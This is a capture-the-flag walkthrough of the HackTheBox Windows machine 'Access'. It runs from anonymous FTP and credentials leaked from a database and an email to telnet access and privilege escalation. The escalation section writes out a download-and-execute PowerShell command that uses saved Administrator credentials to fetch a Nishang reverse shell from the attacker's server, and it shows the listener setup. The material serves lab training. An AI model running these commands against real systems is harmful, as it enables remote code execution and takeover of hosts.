---
title: HTB · Access
slug: htb-access
date: 2026-08-19
image: access
platform: HackTheBox
os: Windows
difficulty: Easy
points: 450
tags: [hackthebox, windows, easy, retired, ftp, telnet, nishang, mdbtools]
description: Access is an easy-difficulty Windows machine on HackTheBox that centers on credential reuse—an anonymously accessible FTP server exposes an Access database and a stored Outlook email, which yield credentials for telnet access, and privilege escalation to SYSTEM is achieved by abusing cached runas/DPAPI credentials stored for the Administrator account.
featured: true
---

# Overview

Access is an easy-difficulty Windows machine on HackTheBox that centers on credential reuse - an anonymously accessible FTP server exposes an Access database and a stored Outlook email, which yield credentials for telnet access, and privilege escalation to SYSTEM is achieved by abusing cached runas/DPAPI credentials stored for the Administrator account.
# Reconnaissance

## Staged Nmap Scanning
````bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.66.92 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

nmap -p$ports -sC -sV -T4 10.129.66.92
````
### Initial Scan Results
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

---
## FTP - 21 TCP
This machine allows anonymous login, so we can connect via ftp with **anonymous@anonymous** credentials.
We see 2 folders here.
```bash
ftp> ls

08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
```
Inside Backups:
```bash
ftp> cd backups
ftp> ls

08-23-18  09:16PM              5652480 backup.mdb
```
Inside Engineer
```bash
ftp> cd Engineer
ftp> ls

08-24-18  01:16AM                10870 Access Control.zip
```
We can download those 2 files to our system and investigate `get backup.mdb`, `get "Access Control.zip"`.
## mdb-tools
The backup.mdb file is a Microsoft Access database file, which can be examined using `mdb-tools`.
```bash
mdb-tables backup.mdb
```
In the listed tables there is one that stands out, it is the auth_user table. Lets try to export it into plain text.
```bash
mdb-export backup.mdb auth_user

id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```
## Foothold
### Access Control.zip
The zip file has a password. After trying a couple of password that we obtained previously `access4u@security` worked.

```
7z x Access\ Control.zip
```
This reveals the file "Access Control.pst", which is a Microsoft Outlook Personal Folder file, used
to store emails and other items. This can be examined further using `readpst`.
```
The password for the "security" account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```
The credential is used to open a telnet session and get the user.txt flag.
```bash
telnet 10.129.66.92

C:\Users\security\Desktop> type user.txt
```
# Privilege Escalation

First let's check the Public user.
There is a file on Desktop called `ZKAccess3.5 Security System.lnk`. `.lnk` files are a binary format but we can use `type` and still see strings.
There is nothing particularly interesting except for this:
```bash
type "ZKAccess3.5 Security System.lnk"

C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred
```
### Nishang
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. This is the setup for it:
```bash
git clone https://github.com/samratashok/nishang.git
mkdir ~/www
cp nishang/Shells/Invoke-PowerShellTcp.ps1 ~/www/
```
### Exploitation
Now I need to serve the shell so that I can get it from Access. I’ll use the `http.server` module in `python3`.
```python
python3 -m http.server 80
```
And start a listener:
```bash
nc -lnvp 443
```
Now we can use the telnet shell to execute:
```powershell
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.12/shell.ps1')"
```
And now we got a shell as Administrator.
```
PS C:\Users\Administrator\Desktop> type root.txt 
```
